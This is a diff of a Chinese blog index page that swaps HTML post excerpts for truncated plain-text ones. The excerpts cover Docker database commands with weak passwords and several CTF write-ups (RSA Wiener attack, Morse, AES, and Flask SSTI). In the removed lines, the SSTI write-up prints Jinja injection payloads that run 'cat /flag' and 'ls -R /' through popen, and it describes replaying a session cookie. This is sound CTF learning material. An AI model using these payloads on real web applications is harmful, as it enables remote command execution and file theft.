@@ -315,8 +315,30 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h2><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run  -p 3306:3306 --name mysql \</span><br><span class="line">	-v <span class="string">"<span class="variable">$(pwd)</span>/mysql"</span>:/var/lib/mysql \</span><br><span class="line">	-e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7</span><br></pre></td></tr></table></figure>
-<h3 id="Postgres"><a href="#Postgres" class="headerlink" title="Postgres"></a>Postgres</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run  --name postgres \</span><br><span class="line">	-v <span class="string">"<span class="variable">$(pwd)</span>/postgres"</span>:/var/lib/postgresql/data \</span><br><span class="line">	-e POSTGRES_PASSWORD=123456 \</span><br><span class="line">	-p 5432:5432 -d postgres</span><br></pre></td></tr></table></figure>
+          数据库
+关系型数据库
+MySQL
+1
+2
+3
+
+
+docker run  -p 3306:3306 --name mysql \
+	-v "$(pwd)/mysql":/var/lib/mysql \
+	-e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7
+
+
+Postgres
+1
+2
+3
+4
+
+
+docker run  --name postgres \
+	-v "$(pwd)/postgres":/var/lib/postgresql/data \
+	-e POSTGRES_PASSWORD=123456 \
+	-p 5432:5432 -d postgre
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/posts/docker/#more" rel="contents">
@@ -403,26 +425,21 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="Shingeki-no-RSA"><a href="#Shingeki-no-RSA" class="headerlink" title="Shingeki no RSA"></a>Shingeki no RSA</h1><p><em>One encryption, three params, you know what to do.</em></p>
-<p><a href="https://drive.google.com/file/d/1xbwFfAHu5OWbkEV3QlYGP59nHXpv57WT/view?usp=sharing" target="_blank" rel="noopener">https://drive.google.com/file/d/1xbwFfAHu5OWbkEV3QlYGP59nHXpv57WT/view?usp=sharing</a></p>
-<hr>
-<p>题目给了一个<code>out.txt</code>,里面包含<code>n</code>,<code>e</code>,<code>c</code>的值</p>
-<p>使用<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">rsa-wiener-attack</a>破解得到d的值</p>
-<pre><code class="shell">~$ python RSAwienerHacker.py
+          Shingeki no RSA
+One encryption, three params, you know what to do.
+
+https://drive.google.com/file/d/1xbwFfAHu5OWbkEV3QlYGP59nHXpv57WT/view?usp=sharing
+
+
+
+
+题目给了一个out.txt,里面包含n,e,c的值
+
+使用rsa-wiener-attack破解得到d的值
+
+~$ python RSAwienerHacker.py
 Hacked!
-50954488565980029757584514143249292352586758895690937600871123296191815851393
-</code></pre>
-<p>代码:</p>
-<pre><code class="python"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes
-<span class="keyword">import</span> gmpy2
-e = <span class="number">573539981054118375159951884901136205381955275096471242113613923667834312363548126598981740314307696033323138227176735824259098674326069670063001503892366653022633390483272968412233602239104757299239510751275655288670147128536527296060843927282827574422039154045360669647002461865276005609405093376965933104257</span>
-n = <span class="number">666012509503758414438426745752029036046328310944346357068259451859585174290580664150188141697939659811599336002592599704089746160399428670863696780761420173279676565150259812749267725206078003773597631925996185977321417456827136083352043009732414371490356153874019687554196902819696964658218055292422529903061</span>
-c = <span class="number">208271638964220806986932660131544686073844142913497222151993342727885811478884727510239109595118929917803309949401762080874858518281133929171859315997601484068462684780596513932104673255797873067799046024798017005908221308124294210078684387266545107254593378287958436606968619452939117043031695740389528821956</span>
-d = <span class="number">50954488565980029757584514143249292352586758895690937600871123296191815851393</span>
-m = gmpy2.powmod(c, d, n)
-print(long_to_bytes(m))
-</code></pre>
-<p><strong>flag:</strong><code>SBCTF{d1d_y0u_us3_w13n3r&#39;s?}</code></p>
+50954488565980029757584514143249292352586758895690937
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/posts/1756116899/#more" rel="contents">
@@ -520,12 +537,15 @@ print(long_to_bytes(m))
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="SEA-LANGUAGE-1"><a href="#SEA-LANGUAGE-1" class="headerlink" title="SEA LANGUAGE 1"></a>SEA LANGUAGE 1</h1><p><em>Quick! Help! We are sinking!</em></p>
-<p><em>Wrap the result in TFCCTF{}</em></p>
-<hr>
-<p>看着像摩斯码,直接在<a href="https://gchq.github.io/CyberChef/#recipe=From_Morse_Code(&#39;Space&#39;,&#39;Line%20feed&#39;" target="_blank" rel="noopener">gchq.github.io</a>&amp;input=Li0tIC4uLi4gLi4uLi0gLSAtLi4uLi0gLi0gLi0uIC4uLi0tIC0uLi4uLSAtLi0tIC0tLS0tIC4uLSAtLi4uLi0gLi4uIC4tLS0tIC0uIC0uLSAuLS0tLSAtLiAtLS4gLS4uLi4tIC4tIC0uLi4gLS0tLS0gLi4tIC0gLi4tLS4uIC0uLS4tLSAtLi0uLS0gLS4tLi0tIC4uLS0uLgo)上解密</p>
-<p><img data-src="../../CTF/TFCCTF2021/Crypto/images/image-20211202204916391.png" alt="image-20211202204916391"></p>
-<p><strong>flag:</strong><code>TFCCTF{WH4T-AR3-Y0U-S1NK1NG-AB0UT?!!!?}</code><br>
+          SEA LANGUAGE 1
+Quick! Help! We are sinking!
+
+Wrap the result in TFCCTF{}
+
+
+
+
+看着像摩斯码,直接在gchq.github.io&input=Li0tIC4uLi4gLi4uLi0gLSAtLi4uLi0gLi0gLi0uIC4uLi0tIC0uLi4uLSAtLi0tIC0tLS0tIC4uLSAtLi4uLi0gLi4uIC4tLS0tIC0uIC0uLSAuLS0tLSAtLiAtLS4gLS4uLi4tIC4tIC0uLi4gLS0tLS0gLi4tIC0gLi4tLS4uIC0uLS4tLSAtLi0uLS0g
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/posts/501486646/#more" rel="contents">
@@ -623,31 +643,25 @@ print(long_to_bytes(m))
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="3in1"><a href="#3in1" class="headerlink" title="3in1"></a>3in1</h1><p><em>Description</em><br><em>Like Nescafeeeee!</em></p>
-<p><em>Attachments</em></p>
-<p><em><a href="https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py" target="_blank" rel="noopener">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py</a></em></p>
-<hr>
-<p>分析代码,发现是AES加密,密钥为<code>hkey</code></p>
-<pre><code class="python">password = (<span class="string">"abda"</span>)    
-hash_obj = SHA256.new(password.encode(<span class="string">'utf-8'</span>))    
+          3in1
+Description
+Like Nescafeeeee!
+
+Attachments
+
+https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py
+
+
+
+
+分析代码,发现是AES加密,密钥为hkey
+
+password = ("abda")    
+hash_obj = SHA256.new(password.encode('utf-8'))    
 hkey = hash_obj.digest()
 
-<span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(info)</span>:</span>
-    cipher = AES.new(hkey, AES.MODE_ECB)
-    result = cipher.decrypt(info)
-    <span class="keyword">return</span> result
-msg =  <span class="string">b'\x1bkw\x00\x01#\x1dv\xd1\x1e\xfb\xba\xac_b\x02T\xfbZ\xca\xac8Y\\8@4\xba;\xe1\x11$\x19\xe8\x89t\t\xc8\xfd\x93\xd8-\xba\xaa\xbe\xf1\xa0\xab\x18\xa0\x12$\x9f\xdb\x08~\x81O\xf0y\xe9\xef\xc41\x1a$\x1cN3\xe8F\\\xef\xc1G\xeb\xdb\xa1\x93*F\x1b|\x1c\xec\xa3\x04\xbf\x8a\xd9\x16\xbc;\xd2\xaav6pWX\xc1\xc0o\xab\xd5V^\x1d\x11\xe4}6\xa4\x1b\\G\xd4e\xc2mP\xdb\x9b\x9f\xb0Z\xf12'</span>
-
-print(decrypt(msg))
-</code></pre>
-<p>AES解密得到两个url,访问url得到文件<code>hint.txt</code>和<code>flag.wav</code></p>
-<pre><code class="python"><span class="string">b'https://www.mediafire.com/file/oii1sm3oyt4tyjc/flag.wav/file\nhttps://www.mediafire.com/file/rgdww91os3we7eo/hint.txt/file'</span>
-</code></pre>
-<p>查看<code>hint.txt</code>,提示我们“图形或照片表示”</p>
-<pre><code>A graphic or photographic representation 
-</code></pre><p>使用<a href="https://www.sonicvisualiser.org/download.html" target="_blank" rel="noopener">Sonic Visualiser</a>打开<code>flag.wav</code>,点击<code>Layer</code>-&gt;<code>Add Spectrogram</code>,得到flag</p>
-<p><img data-src="../../CTF/K3RN3LCTF2021/Crypto/images/image-20211119215941779.png" alt="image-20211119215941779"></p>
-<p><strong>flag:</strong><code>flag{34sY_CH4LL3nGe_w1tH_3Xtr4_St3Ps}</code></p>
+def decrypt(info):
+    cipher = AES.new(hkey, AE
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/posts/3427623925/#more" rel="contents">
@@ -745,47 +759,23 @@ print(decrypt(msg))
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h1><p><em><a href="http://123.60.19.253:10001" target="_blank" rel="noopener">http://123.60.19.253:10001</a></em></p>
-<hr>
-<p>分析给出的源文件,发现<code>/success</code>路由下的<code>name</code>存在SSTI漏洞.</p>
-<p>继续分析,<code>name</code>取自<code>session[&#39;name&#39;]</code>,用户登录时会自动创新用户和删除前一个同名用户的登录信息,那其实我们用注入的代码的作为用户名直接登录即可.</p>
-<pre><code class="python">template =  <span class="string">'''</span>
-<span class="string">Congratulations, %s. You can get flag now!</span>
-<span class="string">'''</span> % name
-<span class="keyword">return</span> render_template_string(template)
-</code></pre>
-<p>要想执行到上述代码,需要给flag投满8票(我们手里只有5票),注意到vote是存储在session中,<code>/vote</code>接口会校验<code>session</code>中保存的vote数量并减一,猜测这里可能存在session会话劫持.</p>
-<p>我们第一次登录时复制一下当前的<code>session</code>,然后给flag投票,等手里的票用光之后,再把第一次登录时复制的<code>seesion</code>粘贴进浏览器保存的Cookie中,我们的票又回来了.</p>
-<blockquote>
-<p>🤠登录后疯狂点击“投票”,也能投满8票;可能因为Server响应太慢,浏览器中保存的session还没来得及被更新,导致多个请求发起时共用一个session(即vote数量相等),session中保存的vote最终只会减一.</p>
-</blockquote>
-<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/0.jpg" alt="image-20211114190032492" style="zoom:50%;"></p>
-<p>使用如下代码作为用户名登录,查看一下当前已加载模块</p>
-<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()}}
-</code></pre>
-<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/1.jpg" alt="image-20211114182131940" style="zoom:50%;"></p>
-<p>人肉计数/写个脚本,找到<code>os._wrap_close</code>模块所在的索引,借助于<code>popen</code>函数可以直接执行系统命令</p>
-<pre><code class="python">num = <span class="number">0</span>
-<span class="keyword">for</span> i <span class="keyword">in</span> a.split(<span class="string">', '</span>):
-    <span class="keyword">if</span> <span class="string">'os._wrap_close'</span> <span class="keyword">in</span> i:
-        print(num)
-    num += <span class="number">1</span>
-</code></pre>
-<p>先<code>ls -a</code>一下,发现<code>config.py</code></p>
-<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -a').read()}}
-</code></pre>
-<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/2.png" alt="image-20211114183143814"><br>继续<code>cat</code>,没有在<code>config.py</code>中找到flag</p>
-<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat config.py').read()}}
-</code></pre>
-<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/3.png" alt="image-20211114183703433"></p>
-<p>用<code>ls -R /</code>找找,发现存在<code>/flag</code>文件</p>
-<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -R /').read()}}
-</code></pre>
-<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/4.jpg" alt="image-20211114183857713"><br>直接<code>cat /flag</code>即可</p>
-<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}
-</code></pre>
-<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/5.png" alt="image-20211114184236370"></p>
-<p><strong>flag:</strong><code>l3hsec{emmMmMM_mm~mMMmm~~T}</code></p>
+          babyflask
+http://123.60.19.253:10001
+
+
+
+
+分析给出的源文件,发现/success路由下的name存在SSTI漏洞.
+
+继续分析,name取自session['name'],用户登录时会自动创新用户和删除前一个同名用户的登录信息,那其实我们用注入的代码的作为用户名直接登录即可.
+
+template =  '''
+Congratulations, %s. You can get flag now!
+''' % name
+return render_template_string(template)
+
+
+要想执行到上述代码,需要给flag投满8票(我们手里只有
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/posts/98571386/#more" rel="contents">
@@ -941,7 +931,7 @@ print(decrypt(msg))
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2021</span>
+  <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
